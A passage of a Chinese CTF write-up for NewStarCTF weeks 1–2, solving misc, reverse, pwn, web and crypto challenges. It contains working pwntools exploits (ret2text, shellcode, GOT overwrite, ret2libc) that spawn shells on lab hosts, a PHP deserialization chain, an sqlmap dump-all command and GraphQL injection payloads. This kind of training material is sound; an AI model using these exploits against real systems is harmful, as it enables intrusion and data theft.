        s = binascii.a2b_hex(&#x27;9b919c9a8685cd8fa294c8a28c88cc89cea2ce9c878480&#x27;)
        ciphertext = xor(s, i)
        print(ciphertext.decode(), i)
except UnicodeDecodeError:
    print(&#x27;wrong&#x27;, i)
</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291927076.png?x-oss-process=hzy" alt="image-20220929192659980"></p>
<p>flag{x0r_i5_qu1t3_3azy}</p>
<h1 id="week1misc">WEEK1|MISC</h1>
<h2 id="yesec-no-drumsticks-1">Yesec no drumsticks 1</h2>
<p>图片lsb得flag</p>
<p>flag{Yesec_1s_lsb}</p>
<h2 id="qsdzs-girlfriend-1">qsdz’s girlfriend 1</h2>
<p>压缩包提示是生日，爆破密码，掩码爆破得到密码是20031201</p>
<p>打开是个</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291929528.png?x-oss-process=hzy" alt="image-20220929192716454"></p>
<p>他是Hikari</p>
<p>所以flag是</p>
<p>flag{Hikari_20031201}</p>
<h2 id="奇怪的音频">奇怪的音频</h2>
<p>Audacity打开之后发现是sstv隐写，使用sstv得到flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291930347.png?x-oss-process=hzy" alt="image-20220929193039238"></p>
<p>flag{SSTV_and_R0b0t36}</p>
<h2 id="look-my-eyes">Look my eyes</h2>
<p>Silent eyes工具隐写，decode之后base64解码得到flag</p>
<p>flag{L0ok_m3_1n_my_ey3s}</p>
<h2 id="ezsnake">EzSnake</h2>
<p>Ce修改游戏是一个残缺的二维码</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291930099.png?x-oss-process=hzy" alt="image-20220929193056006"></p>
<p>补全二维码之后扫码得到</p>
<p>ZmxhZ3tZMHVfNHJlXzBuZV9vTmVfMG5FX3N0NFJ9</p>
<p>解码得到flag</p>
<p>flag{Y0u_4re_0ne_oNe_0nE_st4R}</p>
<h1 id="week1reverse">WEEK1|REVERSE</h1>
<h2 id="hello_reverse">Hello_Reverse</h2>
<p>Ida打开找就完事了</p>
<p>flag{h3llo_r3vers1ng_w0rld}</p>
<h2 id="baby_re">Baby_Re</h2>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291931219.png?x-oss-process=hzy" alt="image-20220929193111146"></p>
<p>跟进compare函数</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291931954.png?x-oss-process=hzy" alt="image-20220929193119872"></p>
<p>Final跟进</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291931003.png?x-oss-process=hzy" alt="image-20220929193136928"></p>
<p>Exp如下</p>
<pre><code class="hljs plaintext">a=[0x66, 0x6D, 0x63, 0x64, 0x7F, 0x56, 0x69, 0x6A, 0x6D, 0x7D, 
  0x62, 0x62, 0x62, 0x6A, 0x51, 0x7D, 0x65, 0x7F, 0x4D, 0x71, 
  0x71, 0x73, 0x79, 0x65, 0x7D, 0x46, 0x77, 0x7A, 0x75, 0x73, 
  0x21, 0x62]
flag=&#x27;&#x27;
for i in range(len(a)):
    flag+=chr(a[i]^i)
print(flag)
#print(len(a))
</code></pre>
<p><strong>flag{Something_run_before_main?}</strong></p>
<p><strong>但是不对，这题不会，我是fw</strong></p>
<h2 id="pyre">Pyre</h2>
<p>Pyc反编译</p>
<p><a href="https://sourceforge.net/projects/pyinstallerextractor/files/dist/pyinstxtractor.py/download?use_mirror=udomain">https://sourceforge.net/projects/pyinstallerextractor/files/dist/pyinstxtractor.py/download?use_mirror=udomain</a></p>
<pre><code class="hljs plaintext">encode = &#x27;REla&#123;PSF!!fg&#125;!Y_SN_1_0U&#x27;
table = [7, 8, 1, 2, 4, 5, 13, 16, 20, 21, 0, 3, 22, 19, 6, 12, 11, 18, 9, 10, 15, 14, 17]
 
# encode = enc(flag)
d = &#123;&#125;
 
result=&#x27;&#x27;
def enc(input):
    tmp = &#x27;&#x27;
    for i in range(len(input)):
        d[table[i]] = encode[i]
 
enc(encode)
for index in sorted(d):
    result+=d[index]
print(result)
</code></pre>
<p>flag{PYRE_1S_S0_FUN!!!}</p>
<h1 id="week1pwn">WEEK1|PWN</h1>
<h2 id="ret2text">ret2text</h2>
<p>栈溢出问题，re2text基础题型，先是查看保护</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291932353.png?x-oss-process=hzy" alt="image-20220929193231252"></p>
<p>六十四位，防堆不防栈，PIE地址随机未开启</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291932677.png?x-oss-process=hzy" alt="image-20220929193241620"></p>
<p>偏移量可以在上面看到偏移量为40</p>
<p>寻找/bin/sh</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291932231.png?x-oss-process=hzy" alt="image-20220929193251143"></p>
<p>地址是0x400708</p>
<pre><code class="hljs plaintext">from pwn import *
p=process(&#x27;./pwn&#x27;)
#p=remote(&#x27;node4.buuoj.cn&#x27;,27924)
payload = b&#x27;a&#x27;*40 + p64(0x400708)  
p.sendline(payload)
p.interactive()
</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291933796.png?x-oss-process=hzy" alt="image-20220929193306720"></p>
<p>flag{0f0ef9bb-5660-4b8b-a13d-e0db585f7639}</p>
<h2 id="ret2shellcode">ret2shellcode</h2>
<pre><code class="hljs plaintext">from pwn import *
from LibcSearcher import *
context(arch = &quot;amd64&quot;, os = &quot;linux&quot;, log_level = &quot;debug&quot;)

io= remote(&#x27;node4.buuoj.cn&#x27;, 25769)
#io = process(&quot;./pwn&quot;)
#gdb.attach(io)
shellcode = asm(shellcraft.sh())
print(len(shellcode))
io.recvuntil(&#x27;for me?&#x27;)
payload1 = shellcode.ljust(0x100,b&#x27;\x90&#x27;)
io.send(payload1)

io.recvuntil(&#x27;else?&#x27;)
payload2 = b&#x27;a&#x27;*56+p64(0x233000)
io.send(payload2)

io.interactive()
</code></pre>
<p>flag{8e971753-e654-4c9d-b6e6-62601fdfaad8}</p>
<h2 id="fallw1nds-gift">fallw1nd’s gift</h2>
<pre><code class="hljs plaintext">from pwn import *
context(arch = &quot;amd64&quot;, os = &quot;linux&quot;, log_level = &quot;debug&quot;)

#p = process(&#x27;./fallw1nd_gift&#x27;)
p = remote(&#x27;node4.buuoj.cn&#x27;, 28071)
elf = ELF(&#x27;./fallw1nd_gift&#x27;)
libc=ELF(&quot;./libc-2.31.so&quot;)

#gdb.attach(p)
puts_got=elf.got[&#x27;puts&#x27;]#puts的got地址

p.recvline()#接收第一行
puts_addr=p.recvline()[0:14]#接收第二行地址
puts_addr=int((puts_addr),16)#把puts_addr转化为数字
p.recvline()#接收第三行
sleep(1)
p.sendline(str(&#x27;004033F8&#x27;))#地址填入puts的got地址

libc_base=puts_addr-libc.symbols[&quot;puts&quot;]#计算libc基址
system_addr=libc_base+libc.symbols[&quot;system&quot;]#计算system地址

p.sendlineafter(&quot;content:&quot;,p64(system_addr))#覆写puts的got为system

p.interactive()

</code></pre>
<p>flag{ae45289b-c487-4d41-b2a0-f2436d02fba4}</p>
<h2 id="calc">calc</h2>
<pre><code class="hljs plaintext">from pwn import *
import string
context.log_level = &#x27;debug&#x27;
p = remote(&quot;node4.buuoj.cn&quot;,29068)
for i in range(100):
        p.recvline(keepends=True)
        p.recvuntil(b&#x27;? &#x27;,drop=True)
        s=p.recvuntil(b&#x27;= &#x27;,drop=True)
        s=s.decode(&#x27;utf-8&#x27;)
        d=&#x27;&#x27;
        for i in s:
                if(i==&#x27;x&#x27;):
                        i=&#x27;*&#x27;
                d+=i
        #p.recvall()
        print(d)
        res=str(eval(d)).encode(&#x27;utf-8&#x27;)
        p.sendlineafter(b&quot;w&quot;, res)
        p.recvline()
p.interactive()
</code></pre>
<p>flag{7f91cd60-1247-4f9a-8e55-2551e66e6d6b}</p>
<h2 id="ret2libc">ret2libc</h2>
<p><a href="http://libc-2.31.so">libc-2.31.so</a></p>
<pre><code class="hljs plaintext">from pwn import *
context.log_level = &#x27;debug&#x27;
context.arch = &#x27;amd64&#x27;
 
elf = ELF(&#x27;./pwn&#x27;)
libc = ELF(&#x27;./libc-2.31.so&#x27;)
r = ROP(elf)

PUTS_GOT = elf.got[b&#x27;puts&#x27;]
RET = 0x40050e
PUTS_PLT = elf.plt[b&#x27;puts&#x27;]
MAIN_PLT = 0x400698
print(elf.plt)
POP_RDI = (r.find_gadget([&#x27;pop rdi&#x27;, &#x27;ret&#x27;]))[0]
  
p = remote(&#x27;node4.buuoj.cn&#x27;,28938)
p.recv()
 
payload =  b&#x27;a&#x27;*0x28+ p64(POP_RDI) + p64(PUTS_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)
p.sendline(payload)
puts_addr = u64(p.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;)) 
print(&quot;puts_addr=&gt;&quot; + hex(puts_addr))
 
libc_addr = puts_addr -  libc.sym[b&#x27;puts&#x27;]
print(hex(libc_addr))

payload = b&#x27;a&#x27;*0x28   +p64(RET) +  p64(POP_RDI)+p64(libc_addr+ libc.search(b&#x27;/bin/sh\0&#x27;).__next__())+p64(libc_addr+libc.sym[b&#x27;system&#x27;])
print(payload)
p.send(payload)
p.interactive()

</code></pre>
<p>flag{47b6ce18-1115-439e-9e99-0e62d82ca968}</p>
<h1 id="week2misc">WEEK2|MISC</h1>
<h2 id="yesec-no-drumsticks-2">Yesec no drumsticks 2</h2>
<p>零宽字符隐写</p>
<p><a href="http://330k.github.io/misc_tools/unicode_steganography.html">Unicode Steganography with Zero-Width Characters (330k.github.io)</a></p>
<p>得到86MygAZ2uJi2oCxctsd28LBNRXHPLykF5LBz8f1xEikWNVpKfpce2CMHvhSJUdk7CHLrEVhGRVQvMwT8r7JUgVWGbnzxb</p>
<p>Base58解密—&gt;hex转str得到flag</p>
<p>flag{Ingr3d1ent_0F_Yesec_i5_OOOOO}</p>
<h2 id="coldwindss-desktop">Coldwinds’s Desktop</h2>
<p>图片拼图得到flag</p>
<p>看这个文章用这个工具<a href="https://blog.csdn.net/ZT7524/article/details/119981204">(62条消息) CTF图片拼图&amp;安装坑点_Solarzhou的博客-CSDN博客_ctf拼图题</a></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291934783.png?x-oss-process=hzy" alt="image-20220929193457657"></p>
<p>flag{Y0u_successfu11y_s01ved_the_puzz1e}</p>
<h2 id="奇怪的二维码">奇怪的二维码</h2>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291935331.png?x-oss-process=hzy" alt="image-20220929193521264"></p>
<p>缺个定位Aztec二维码</p>
<p><a href="https://blog.csdn.net/m0_52100140/article/details/121190898">(62条消息) 2021SC@SDUSC Zxing开源代码（十二）Aztec二维码（一）_番茄炒蛋不加蛋！的博客-CSDN博客_aztec二维码</a></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209301942165.png?x-oss-process=hzy" alt="code2"></p>
<p>扫码得到flag</p>
<p><a href="https://products.aspose.app/barcode/zh-hans/recognize/aztec#/recognized">在线阅读Aztec条码 (aspose.app)</a></p>
<p>flag{Aztec_from_Age_0f_Empires}</p>
<h2 id="qsdzs-girlfriend-2">qsdz’s girlfriend 2</h2>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291936501.png?x-oss-process=hzy" alt="image-20220929193613363"></p>
<p>N=0x61 à97</p>
<p>A=0x726e à29294</p>
<p>B=0x6f6c64 à7302244</p>
<p>猫脸变换</p>
<p>[(62条消息) <a href="https://blog.csdn.net/qq_42880719/article/details/124371307?spm=1001.2014.3001.5501">Misc]2022DASCTF Apr X FATE 防疫挑战赛 wp_是Mumuzi的博客-CSDN博客</a></p>
<pre><code class="hljs plaintext">import cv2
import numpy as np

def arnold_decode(image, shuffle_times, a, b):
    &quot;&quot;&quot; decode for rgb image that encoded by Arnold
    Args:
        image: rgb image encoded by Arnold
        shuffle_times: how many times to shuffle
    Returns:
        decode image
    &quot;&quot;&quot;
    # 1:创建新图像
    decode_image = np.zeros(shape=image.shape,dtype=int)

    # 2：计算N
    h, w = image.shape[0], image.shape[1]
    N = h  # 或N=w

    # 3：遍历像素坐标变换
    for time in range(shuffle_times):
        for ori_x in range(h):
            for ori_y in range(w):
                # 按照公式坐标变换
                new_x = ((a * b + 1) * ori_x + (-b) * ori_y) % N
                new_y = ((-a) * ori_x + ori_y) % N
                decode_image[new_x, new_y, :] = image[ori_x, ori_y, :]
    return decode_image

img = cv2.imread(&quot;girlfriend.png&quot;)  #变换的图片
a = 29294
b = 7302244
st = 97
pic = arnold_decode(img,st,a,b)
cv2.imwrite(&#x27;flag2.png&#x27;,pic)  #保存得到的图片
</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291936386.png?x-oss-process=hzy" alt="image-20220929193635243"></p>
<p>得到flag</p>
<p>flag{按理说这个点猪也该醒了}</p>
<h2 id="奇怪的波形复现">奇怪的波形(复现)</h2>
<p>题目给了一个算法和一个通过算法生成的图片</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210310835518.png?x-oss-process=hzy" alt="image-20221031083532291"></p>
<pre><code class="hljs plaintext">for (i = 0; i &lt; 16; i++)  
&#123;
    tmp = S * S;
    S = tmp % N;
    if (key[i] == 1)
    &#123;
        tmp = S * m;
        S = tmp % N;
    &#125;
    else
    &#123;
        tmp = S * S;
        S = tmp % N;
    &#125;
&#125;
return m, S;</code></pre>
<p>简单看一下这个算法，就是一个for循环，循环十六次，当key=1执行的和key!=1执行的内容是不一样的</p>
<p>查看一下图片可以看到波形有32个，说明每执行一次for循环会生成两个波</p>
<p>当两个波相等时也就是key=0的时候，不相等也就是key=1</p>
<p>然后看一下就知道十六次的结果是0010001001100111</p>
<p>即flag{0010001001100111}</p>
<h1 id="week2web">WEEK2|WEB</h1>
<h2 id="unserializeone">UnserializeOne</h2>
<p>题目如下</p>
<pre><code class="hljs plaintext">&lt;?php
error_reporting(0);
highlight_file(__FILE__);
#Something useful for you : https://zhuanlan.zhihu.com/p/377676274
class Start&#123;
    public $name;
    protected $func;

    public function __destruct()
    &#123;
        echo &quot;Welcome to NewStarCTF, &quot;.$this-&gt;name;
    &#125;

    public function __isset($var)
    &#123;
        ($this-&gt;func)();
    &#125;
&#125;

class Sec&#123;
    private $obj;
    private $var;

    public function __toString()
    &#123;
        $this-&gt;obj-&gt;check($this-&gt;var);
        return &quot;CTFers&quot;;
    &#125;

    public function __invoke()
    &#123;
        echo file_get_contents(&#x27;/flag&#x27;);
    &#125;
&#125;

class Easy&#123;
    public $cla;

    public function __call($fun, $var)
    &#123;
        $this-&gt;cla = clone $var[0];
    &#125;
&#125;

class eeee&#123;
    public $obj;

    public function __clone()
    &#123;
        if(isset($this-&gt;obj-&gt;cmd))&#123;
            echo &quot;success&quot;;
        &#125;
    &#125;
&#125;

if(isset($_POST[&#x27;pop&#x27;]))&#123;
    unserialize($_POST[&#x27;pop&#x27;]);
&#125;
</code></pre>
<p>链子如下</p>
<pre><code class="hljs plaintext">&lt;?php
error_reporting(E_ALL &amp; ~E_WARNING);
highlight_file(__FILE__);
#Something useful for you : https://zhuanlan.zhihu.com/p/377676274
class Start&#123;
    public $name;
    protected $func;
    public function __construct($a)
    &#123;
        $this-&gt;func = $a;
    &#125;

    public function __destruct()
    &#123;
        echo &quot;Welcome to NewStarCTF, &quot;.$this-&gt;name;
    &#125;

    public function __isset($var)
    &#123;
        ($this-&gt;func)();
    &#125;
&#125;

class Sec&#123;
    private $obj;
    private $var;

    public function __construct($a, $b)
    &#123;
        $this-&gt;obj = $a;
        $this-&gt;var = $b;

    &#125;
    public function __toString()
    &#123;
        $this-&gt;obj-&gt;check($this-&gt;var);
        return &quot;CTFers&quot;;
    &#125;

    public function __invoke()
    &#123;
        echo file_get_contents(&#x27;/flag&#x27;);
    &#125;
&#125;

class Easy&#123;
    public $cla;

    public function __call($fun, $var)
    &#123;
        $this-&gt;cla = clone $var[0];
    &#125;
&#125;

class eeee&#123;
    public $obj;

    public function __clone()
    &#123;
        if(isset($this-&gt;obj-&gt;cmd))&#123;
            echo &quot;success&quot;;
        &#125;
    &#125;
&#125;

$target = new Sec(&#x27;&#x27;,&#x27;&#x27;);

$d = new Start($target);

$c = new eeee;
$c-&gt;obj = $d;

$b = new Easy;

$a = new Sec($b, $c);

$entry = new Start($a);
$entry-&gt;name = $a;

echo urlencode(serialize($entry));
</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291938109.png?x-oss-process=hzy" alt="image-20220929193853022"></p>
<p>flag{570f9965-dd7b-46e8-8034-6305bd9dbae6}</p>
<h2 id="includeone">IncludeOne</h2>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291939940.png?x-oss-process=hzy" alt="image-20220929193915636"></p>
<p><a href="https://www.cnblogs.com/zaqzzz/p/9997855.html">php伪随机数漏洞 以及脚本php_mt_seed的使用教程 - 冬泳怪鸽 - 博客园 (cnblogs.com)</a></p>
<p>先是这个伪随机数爆破，使用题目上面给的工具编译一下即可使用</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291939281.png?x-oss-process=hzy" alt="image-20220929193933178"></p>
<p>过滤了base，用rot13，但是传参的file里要有NewStar，用/或者%0a都不行，用vps外带也不行，最后发现在伪协议部分使用|可以成立</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291941232.png?x-oss-process=hzy" alt="image-20220929193959124"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291940168.png?x-oss-process=hzy" alt="image-20220929194005097"></p>
<p>直接读flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291940654.png?x-oss-process=hzy" alt="image-20220929194020590"></p>
<p>解密一下得到明文flag</p>
<p>flag{b4460905-114d-4e43-b071-a067139e47db}</p>
<h2 id="word-for-you2-gen复现">Word-For-You(2 Gen)(复现)</h2>
<blockquote>
<p>哇哇哇，我把查询界面改了，现在你们不能从数据库中拿到东西了吧哈哈（不过为了调试的代码似乎忘记删除了</p>
</blockquote>
<p>这道题目直接sqlmap尝试了但是没跑出来，后来看大佬博客发现也是sqlmap跑</p>
<pre><code class="hljs plaintext">python .\sqlmap.py -u http://c976493d-0b86-49c7-af38-89ce184e5fca.node4.buuoj.cn:81/comments.php --data=&quot;name=NewCTFer&quot; --random-agent -D wfy --dump-all</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210161624977.png?x-oss-process=hzy" alt="image-20221016162353754"></p>
<p>我只能说sqlmap还是很强的，没有掌握它的精髓</p>
<p>flag{Ju4t_m2ke_some_err0rs}</p>
<h2 id="ezapi复现">ezAPI(复现)</h2>
<blockquote>
<p>qsdz开发了一个查询网页，但是好像存在一些漏洞？</p>
</blockquote>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210161636553.png?x-oss-process=hzy" alt="image-20221016163612357"></p>
<p>一个查询页面，有数据就显示查询到的内容，无数据就显示null</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210161636890.png?x-oss-process=hzy" alt="image-20221016163657789"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210161637534.png?x-oss-process=hzy" alt="image-20221016163709429"></p>
<p>而且只能数字，字母被过滤了</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210161638125.png?x-oss-process=hzy" alt="image-20221016163809004"></p>
<p>源码泄露</p>
<pre><code class="hljs plaintext">&lt;!DOCTYPE html&gt;
&lt;html&gt;

&lt;head&gt;
    &lt;meta charset=&quot;utf-8&quot; /&gt;
    &lt;title&gt;Search Page&lt;/title&gt;
    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;css/style.css&quot; tppabs=&quot;css/style.css&quot; /&gt;
    &lt;style&gt;
        body &#123;
            height: 100%;
            background: #16a085;
            overflow: hidden;
        &#125;

        canvas &#123;
            z-index: -1;
            position: absolute;
        &#125;
    &lt;/style&gt;
    &lt;script src=&quot;js/jquery.js&quot;&gt;&lt;/script&gt;
    &lt;script src=&quot;js/verificationNumbers.js&quot; tppabs=&quot;js/verificationNumbers.js&quot;&gt;&lt;/script&gt;
    &lt;script src=&quot;js/Particleground.js&quot; tppabs=&quot;js/Particleground.js&quot;&gt;&lt;/script&gt;
    &lt;script&gt;
        $(document).ready(function() &#123;
            $(&#x27;body&#x27;).particleground(&#123;
                dotColor: &#x27;#5cbdaa&#x27;,
                lineColor: &#x27;#5cbdaa&#x27;
            &#125;);
        &#125;);ß
    &lt;/script&gt;
&lt;/head&gt;
&lt;!--unremove DEBUG function, please delete it--&gt;
&lt;body&gt;
    &lt;dl class=&quot;admin_login&quot;&gt;
        &lt;dt&gt;
            &lt;font color=&quot;white&quot;&gt;&lt;strong&gt;Search Page Beta&lt;/strong&gt;&lt;/font&gt;
        &lt;/dt&gt;
        &lt;form action=&quot;index.php&quot; method=&quot;post&quot;&gt;
            &lt;dd class=&quot;user_icon&quot;&gt;
                &lt;input type=&quot;text&quot; name=&quot;id&quot; placeholder=&quot;用户ID&quot; class=&quot;login_txtbx&quot; /&gt;
            &lt;/dd&gt;
            &lt;dd&gt;
                &lt;input type=&quot;submit&quot; value=&quot;Search&quot; class=&quot;submit_btn&quot; /&gt;
            &lt;/dd&gt;
        &lt;/form&gt;&lt;br&gt;
        &lt;center&gt;
            &lt;font size=&quot;4px&quot; color=&quot;white&quot;&gt;
                &lt;?php
                error_reporting(0);
                $id = $_POST[&#x27;id&#x27;];
                function waf($str)
                &#123;
                    if (!is_numeric($str) || preg_replace(&quot;/[0-9]/&quot;, &quot;&quot;, $str) !== &quot;&quot;) &#123;
                        return False;
                    &#125; else &#123;
                        return True;
                    &#125;
                &#125;

                function send($data)
                &#123;
                    $options = array(
                        &#x27;http&#x27; =&gt; array(
                            &#x27;method&#x27; =&gt; &#x27;POST&#x27;,
                            &#x27;header&#x27; =&gt; &#x27;Content-type: application/json&#x27;,
                            &#x27;content&#x27; =&gt; $data,
                            &#x27;timeout&#x27; =&gt; 10 * 60
                        )
                    );
                    $context = stream_context_create($options);
                    $result = file_get_contents(&quot;http://graphql:8080/v1/graphql&quot;, false, $context);
                    return $result;
                &#125;

                if (isset($id)) &#123;
                    if (waf($id)) &#123;
                        isset($_POST[&#x27;data&#x27;]) ? $data = $_POST[&#x27;data&#x27;] : $data = &#x27;&#123;&quot;query&quot;:&quot;query&#123;\nusers_user_by_pk(id:&#x27; . $id . &#x27;) &#123;\nname\n&#125;\n&#125;\n&quot;, &quot;variables&quot;:null&#125;&#x27;;
                        $res = json_decode(send($data));
                        if ($res-&gt;data-&gt;users_user_by_pk-&gt;name !== NULL) &#123;
                            echo &quot;ID: &quot; . $id . &quot;&lt;br&gt;Name: &quot; . $res-&gt;data-&gt;users_user_by_pk-&gt;name;
                        &#125; else &#123;
                            echo &quot;&lt;b&gt;Can&#x27;t found it!&lt;/b&gt;&lt;br&gt;&lt;br&gt;DEBUG: &quot;;
                            var_dump($res-&gt;data);
                        &#125;
                    &#125; else &#123;
                        die(&quot;&lt;b&gt;Hacker! Only Number!&lt;/b&gt;&quot;);
                    &#125;
                &#125; else &#123;
                    die(&quot;&lt;b&gt;No Data?&lt;/b&gt;&quot;);
                &#125;
                ?&gt;
            &lt;/font&gt;
        &lt;/center&gt;
    &lt;/dl&gt;
&lt;/body&gt;

&lt;/html&gt;</code></pre>
<p>这是graphql的api</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210161647384.png?x-oss-process=hzy" alt="image-20221016164712308"></p>
<p>能完全控制执行语句，具有回显，具体操作如下</p>
<pre><code class="hljs plaintext">data=&#123;&quot;query&quot;:&quot;&#123;__schema &#123;types &#123;name&#125;&#125;&#125;&quot;&#125;&amp;id=1</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210161649504.png?x-oss-process=hzy" alt="image-20221016164903305"></p>
<pre><code class="hljs plaintext">data=&#123;&quot;query&quot;:&quot;\u0071\u0075\u0065\u0072\u0079\u007b\u005f\u005f\u0074\u0079\u0070\u0065\u0028\u006e\u0061\u006d\u0065\u003a\u0022\u0066\u0066\u0066\u0066\u006c\u006c\u006c\u006c\u0061\u0061\u0061\u0067\u0067\u0067\u0067\u005f\u0031\u006e\u005f\u0068\u0033\u0072\u0033\u005f\u0066\u006c\u0061\u0067\u0022\u0029\u007b\u0020\u0066\u0069\u0065\u006c\u0064\u0073\u0020\u007b\u0020\u0064\u0065\u0073\u0063\u0072\u0069\u0070\u0074\u0069\u006f\u006e\u0020\u006e\u0061\u006d\u0065\u0020\u0074\u0079\u0070\u0065\u0020\u007b\u0020\u006e\u0061\u006d\u0065\u0020\u006b\u0069\u006e\u0064\u0020\u006f\u0066\u0054\u0079\u0070\u0065\u0020\u007b\u0020\u006e\u0061\u006d\u0065\u0020\u006b\u0069\u006e\u0064\u0020\u0064\u0065\u0073\u0063\u0072\u0069\u0070\u0074\u0069\u006f\u006e\u007d\u007d\u007d\u007d\u007d&quot;&#125;&amp;id=1</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210161650778.png?x-oss-process=hzy" alt="image-20221016165027639"></p>
<pre><code class="hljs plaintext">data=&#123;&quot;query&quot;:&quot;query&#123;ffffllllaaagggg_1n_h3r3_flag&#123;flag&#125;&#125;&quot;&#125;&amp;id=1</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210161651753.png?x-oss-process=hzy" alt="image-20221016165116580"></p>
<p>flag{4a902c8e-a8b5-ecfb-bee3-d6419865647c}</p>
<h1 id="week2crypto">WEEK2|CRYPTO</h1>
<h2 id="ezrabin">ezRabin</h2>
<p>题目如下</p>
<pre><code class="hljs plaintext">from Crypto.Util.number import *
from somewhere_you_do_not_know import flag
#flag格式为 flag&#123;XXXX&#125;
def ezprime(n):
    p=getPrime(n)
    while p%4!=3:
        p=getPrime(n)
    return p
p=ezprime(512)
q=ezprime(512)
n=p*q
m=bytes_to_long(flag)
m=(m&lt;&lt;(300))+getRandomNBitInteger(300)
assert m**2&gt;n and m&lt;n
c=pow(m,4,n)
print(&#x27;c=&#x27;,c)
print(&#x27;p=&#x27;,p)
print(&#x27;q=&#x27;,q)
&#x27;&#x27;&#x27;
c= 59087040011818617875466940950576089096932769518087477304162753047334728508009365510335057824251636964132317478310267427589970177277870220660958570994888152191522928881774614096675980017700457666192609573774572571582962861504174396725705862549311100229145101667835438230371282904888448863223898642183925834109
p= 10522889477508921233145726452630168129218487981917965097647277937267556441871668611904567713868254050044587941828674788953975031679913879970887998582514571
q= 11287822338267163056031463255265099337492571870189068887689824393221951058498526362126606231275830844407608185240702408947800715624427717739233431252556379
就要花里胡哨（
</code></pre>
<p>知道n，c，p，q，e</p>
<p>脚本如下</p>
<pre><code class="hljs plaintext">from sympy import *
from gmpy2 import *
from libnum import *

c= 59087040011818617875466940950576089096932769518087477304162753047334728508009365510335057824251636964132317478310267427589970177277870220660958570994888152191522928881774614096675980017700457666192609573774572571582962861504174396725705862549311100229145101667835438230371282904888448863223898642183925834109
p= 10522889477508921233145726452630168129218487981917965097647277937267556441871668611904567713868254050044587941828674788953975031679913879970887998582514571
q= 11287822338267163056031463255265099337492571870189068887689824393221951058498526362126606231275830844407608185240702408947800715624427717739233431252556379


c1=nthroot_mod(c, 4, p, all_roots=True)
c2  =nthroot_mod(c, 4, q, all_roots=True)

x1=solve_crt([c1[0],c2[0]],[p,q ])
x2=solve_crt([c1[0],c2[1]],[p,q ])
x3=solve_crt([c1[1],c2[0]],[p,q ])
x4=solve_crt([c1[1],c2[1]],[p,q ])

print (hex(x4)[2:96])
</code></pre>
<p>flag{R4bin_3ncrypti0n_with_3_mod_4_is_two_e4sy}</p>
<p><a href="https://www.bilibili.com/read/cv13467317/">【CTF-RSA】rabin解密脚本 - 哔哩哔哩 (bilibili.com)</a></p>
<h2 id="unusual_base">unusual_base</h2>
<p>题目如下</p>
<pre><code class="hljs plaintext">from secret import flag
from Crypto.Util.number import *
from random import shuffle
from string import ascii_lowercase, ascii_uppercase, digits

alphabet = ascii_uppercase + ascii_lowercase + digits +&#x27;$&amp;&#x27;
alphabet = list(alphabet)
bits = &#x27;&#x27;
pad_len = len(flag) % 3

for f in flag:
            bits += bin(f)[2:].rjust(8,&#x27;0&#x27;)
bits += &#x27;0000&#x27;*pad_len
encoded = &#x27;&#x27;
shuffle(alphabet)
alphabet = &quot;&quot;.join(alphabet)
for i in range(0, len(bits), 6):
    encoded += alphabet[int(bits[i:i+6], 2)]
encoded += &#x27;%&#x27;*pad_len
print(f&#x27;encoded = &quot;&#123;encoded&#125;&quot;&#x27;)
print(f&#x27;alphabet = &quot;&#123;alphabet&#125;&quot;&#x27;)</code></pre>
<pre><code class="hljs plaintext">encoded = &quot;GjN3G$B3de58ym&amp;7wQh9dgVNGQhfG2hndsGjlOyEdaxRFY%&quot;
alphabet = &quot;c5PKAQmgI&amp;qSdyDZYCbOV2seXGloLwtFW3f9n7j481UMHBp6vNETRJa$rxuz0hik&quot;</code></pre>
